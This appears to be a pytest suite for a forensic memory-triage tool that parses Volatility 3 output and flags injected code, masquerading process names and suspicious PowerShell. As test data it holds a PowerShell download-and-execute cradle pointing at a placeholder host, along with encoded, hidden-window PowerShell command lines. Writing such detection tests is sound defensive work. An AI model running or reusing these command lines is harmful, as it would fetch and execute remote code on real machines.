"""Volatility 3 JSON parsing and the memory triage rules."""

from __future__ import annotations

import json
from pathlib import Path
from typing import Any

import pytest

from dfir_toolkit import memory
from dfir_toolkit._io import InputError

FIXTURES = Path(__file__).resolve().parent / "fixtures" / "memory"


def proc(pid: int, ppid: int, name: str, exit_time: str | None = None) -> dict[str, Any]:
    """A pslist/psscan row."""
    return {
        "PID": pid,
        "PPID": ppid,
        "ImageFileName": name,
        "CreateTime": "2026-10-30T08:00:00+00:00",
        "ExitTime": exit_time,
    }


BASE = [
    proc(4, 0, "System"),
    proc(596, 508, "wininit.exe"),
    proc(700, 596, "services.exe"),
    proc(712, 596, "lsass.exe"),
    proc(1120, 1096, "explorer.exe"),
]


def rules(findings: list[memory.Finding]) -> set[tuple[int, str]]:
    """(pid, rule) pairs."""
    return {(f.pid, f.rule) for f in findings}


def test_injected_image_gives_exactly_the_planted_findings() -> None:
    findings = memory.triage(memory.load_directory(FIXTURES / "injected"))
    assert rules(findings) == {
        (712, "duplicate-singleton"),
        (2690, "duplicate-singleton"),
        (2690, "unexpected-parent"),
        (2384, "document-spawned-shell"),
        (2384, "suspicious-powershell"),
        (2384, "flagged-process-external-connection"),
        (2512, "unexpected-parent"),
        (2512, "system-binary-wrong-path"),
        (2730, "masquerading-name"),
        (3100, "injected-pe"),
        (3100, "flagged-process-external-connection"),
        (3220, "injected-code"),
        (3348, "hidden-process"),
    }
    assert memory.summary_counts(findings) == {"high": 12, "medium": 1, "low": 0}
    order = [memory.SEVERITY_ORDER[f.severity] for f in findings]
    assert order == sorted(order)


def test_clean_image_gives_no_findings() -> None:
    assert memory.triage(memory.load_directory(FIXTURES / "clean")) == []


def test_fixture_files_parse_with_the_volatility_banner() -> None:
    text = (FIXTURES / "injected" / "pslist.json").read_text(encoding="utf-8")
    assert text.startswith("Volatility 3 Framework")
    assert len(memory.parse_vol_json(text, "pslist")) == 19


def test_children_are_flattened_depth_first() -> None:
    tree = [
        {**proc(1, 0, "a"), "__children": [{**proc(2, 1, "b"), "__children": [{**proc(3, 2, "c"), "__children": []}]}]},
        {**proc(4, 0, "d"), "__children": []},
    ]
    rows = memory.parse_vol_json(json.dumps(tree), "pslist")
    assert [r["PID"] for r in rows] == [1, 2, 3, 4]
    assert all("__children" not in r for r in rows)


@pytest.mark.parametrize(
    ("text", "message"),
    [
        ("Volatility 3 Framework 2.28.2\n", "no JSON list"),
        ("[{", "not JSON"),
        ("[1]", "is not an object"),
        (json.dumps([{"PID": 1}]), "lacks"),
        (json.dumps([{**proc(1, 0, "a"), "PID": "1"}]), "non-integer PID"),
        (json.dumps([{**proc(1, 0, "a"), "PID": True}]), "non-integer PID"),
        (json.dumps([{**proc(1, 0, "a"), "__children": {}}]), "__children must be a list"),
    ],
)
def test_malformed_output_is_rejected(text: str, message: str) -> None:
    with pytest.raises(InputError, match=message):
        memory.parse_vol_json(text, "pslist")


def test_json_that_is_not_a_list_is_rejected() -> None:
    with pytest.raises(InputError, match=r"no JSON list|expected a JSON list"):
        memory.parse_vol_json('{"a": [1]}', "pslist")


def test_unknown_plugin_is_rejected() -> None:
    with pytest.raises(ValueError, match="unknown plugin"):
        memory.parse_vol_json("[]", "yarascan")


def test_pslist_is_required(tmp_path: Path) -> None:
    with pytest.raises(InputError, match=r"pslist\.json is required"):
        memory.load_directory(tmp_path)
    with pytest.raises(InputError, match="pslist output is required"):
        memory.triage({})


def test_empty_pslist_gives_no_findings() -> None:
    assert memory.triage({"pslist": []}) == []


def test_exited_processes_found_by_psscan_are_not_hidden() -> None:
    psscan = [*BASE, proc(900, 1120, "gone.exe", "2026-10-30T09:00:00+00:00"), proc(901, 1120, "hid.exe")]
    assert rules(memory.triage({"pslist": BASE, "psscan": psscan})) == {(901, "hidden-process")}


def test_without_psscan_no_hidden_process_rule_runs() -> None:
    assert memory.triage({"pslist": BASE}) == []


def test_real_windows_names_near_core_names_are_not_masquerading() -> None:
    names = [
        "sihost.exe",
        "taskhost.exe",
        "conhost.exe",
        "dllhost.exe",
        "lsm.exe",
        "csrss.exe",
        "smss.exe",
        "winlogon.exe",
        "chrome.exe",
        "msedge.exe",
    ]
    pslist = BASE + [proc(2000 + i, 1120, n) for i, n in enumerate(names)]
    assert [f for f in memory.triage({"pslist": pslist}) if f.rule == "masquerading-name"] == []


@pytest.mark.parametrize(
    "name", ["svch0st.exe", "lsas.exe", "lsasss.exe", "scvhost.exe", "servlces.exe", "expl0rer.exe"]
)
def test_lookalike_names_are_masquerading(name: str) -> None:
    findings = memory.triage({"pslist": [*BASE, proc(3000, 1120, name)]})
    assert (3000, "masquerading-name") in rules(findings)


def test_parent_check_skips_processes_whose_parent_exited() -> None:
    assert memory.triage({"pslist": [*BASE, proc(820, 9999, "svchost.exe")]}) == []


def test_exited_singletons_do_not_count_twice() -> None:
    pslist = [*BASE, proc(713, 596, "lsass.exe", "2026-10-30T08:01:00+00:00")]
    assert memory.triage({"pslist": pslist}) == []


def mal(protection: str, private: int, hexdump: str) -> dict[str, Any]:
    """A malfind row."""
    return {
        "PID": 50,
        "Process": "x.exe",
        "Start VPN": 0x10000,
        "Protection": protection,
        "PrivateMemory": private,
        "Hexdump": hexdump,
    }


@pytest.mark.parametrize(
    ("row", "want"),
    [
        (mal("PAGE_EXECUTE_READWRITE", 1, "4d 5a 90 00"), "injected-pe"),
        (mal("PAGE_EXECUTE_WRITECOPY", 1, "4D 5A 90 00"), "injected-pe"),
        (mal("PAGE_EXECUTE_READWRITE", 1, "fc 48 83 e4"), "injected-code"),
        (mal("PAGE_EXECUTE_READWRITE", 1, "00 00 00 00"), None),
        (mal("PAGE_EXECUTE_READWRITE", 1, ""), None),
        (mal("PAGE_EXECUTE_READ", 1, "4d 5a 90 00"), None),
        (mal("PAGE_EXECUTE_READWRITE", 0, "4d 5a 90 00"), None),
    ],
)
def test_malfind_rules(row: dict[str, Any], want: str | None) -> None:
    found = [f.rule for f in memory.triage({"pslist": [], "malfind": [row]})]
    assert found == ([want] if want else [])


@pytest.mark.parametrize(
    ("args", "severity"),
    [
        ("powershell.exe -enc AAAA", "medium"),
        ("powershell.exe -EncodedCommand AAAA -WindowStyle Hidden", "high"),
        ("powershell -c IEX (New-Object Net.WebClient).DownloadString('https://example.invalid/a')", "medium"),
        ("powershell.exe -encodedcom AAAA", "medium"),
        ("powershell.exe /enc AAAA -windows hidden", "high"),
        ("powershell.exe -File C:\\scripts\\backup.ps1", None),
    ],
)
def test_powershell_rule(args: str, severity: str | None) -> None:
    findings = memory.triage({"pslist": [], "cmdline": [{"PID": 9, "Process": "powershell.exe", "Args": args}]})
    assert [f.severity for f in findings] == ([severity] if severity else [])


@pytest.mark.parametrize(
    ("args", "flagged"),
    [
        ("C:\\Windows\\System32\\svchost.exe -k netsvcs", False),
        ("\\??\\C:\\Windows\\system32\\svchost.exe", False),
        ("C:\\Windows\\SysWOW64\\svchost.exe", False),
        ("svchost.exe -k netsvcs", False),
        ("C:\\Temp\\svchost.exe -k netsvcs", True),
        ('"C:\\Program Files\\x\\lsass.exe"', True),
    ],
)
def test_system_binary_path_rule(args: str, flagged: bool) -> None:
    name = "lsass.exe" if "lsass" in args else "svchost.exe"
    findings = memory.triage({"pslist": [], "cmdline": [{"PID": 9, "Process": name, "Args": args}]})
    assert ("system-binary-wrong-path" in [f.rule for f in findings]) is flagged


@pytest.mark.parametrize(
    ("addr", "external"),
    [
        ("203.0.113.5", True),
        ("8.8.8.8", True),
        ("10.1.2.3", False),
        ("172.20.0.1", False),
        ("192.168.0.1", False),
        ("127.0.0.1", False),
        ("0.0.0.0", False),
        ("::1", False),
        ("fe80::1", False),
        ("*", False),
        ("2001:db8::1", True),
    ],
)
def test_external_address(addr: str, external: bool) -> None:
    assert memory._is_external(addr) is external


def test_network_rule_needs_a_flagged_established_external_connection() -> None:
    pslist = [*BASE, proc(3000, 1120, "svch0st.exe"), proc(3001, 1120, "ok.exe")]
    net = [
        {
            "PID": 3000,
            "Proto": "TCPv4",
            "LocalAddr": "10.0.0.2",
            "LocalPort": 5000,
            "ForeignAddr": "203.0.113.9",
            "ForeignPort": 443,
            "State": "ESTABLISHED",
            "Owner": "svch0st.exe",
        },
        {
            "PID": 3000,
            "Proto": "TCPv4",
            "LocalAddr": "10.0.0.2",
            "LocalPort": 5001,
            "ForeignAddr": "203.0.113.9",
            "ForeignPort": 443,
            "State": "CLOSED",
            "Owner": "svch0st.exe",
        },
        {
            "PID": 3001,
            "Proto": "TCPv4",
            "LocalAddr": "10.0.0.2",
            "LocalPort": 5002,
            "ForeignAddr": "203.0.113.9",
            "ForeignPort": 443,
            "State": "ESTABLISHED",
            "Owner": "ok.exe",
        },
    ]
    found = [
        f for f in memory.triage({"pslist": pslist, "netscan": net}) if f.rule == "flagged-process-external-connection"
    ]
    assert [(f.pid, f.evidence["remote"]) for f in found] == [(3000, "203.0.113.9:443")]


def test_markdown_report() -> None:
    findings = memory.triage(memory.load_directory(FIXTURES / "injected"))
    text = memory.report_markdown(findings, "case")
    assert "13 findings: 12 high, 1 medium, 0 low." in text
    assert text.count("\n| high |") == 12


def test_edit_distance() -> None:
    assert memory._edit_distance("svchost.exe", "svchost.exe") == 0
    assert memory._edit_distance("svch0st.exe", "svchost.exe") == 1
    assert memory._edit_distance("", "abc") == 3


def test_three_edits_away_is_not_masquerading() -> None:
    assert min(memory._edit_distance("svc.exe", c) for c in memory.CORE_NAMES) == 3
    findings = memory.triage({"pslist": [*BASE, proc(3000, 1120, "svc.exe")]})
    assert findings == []
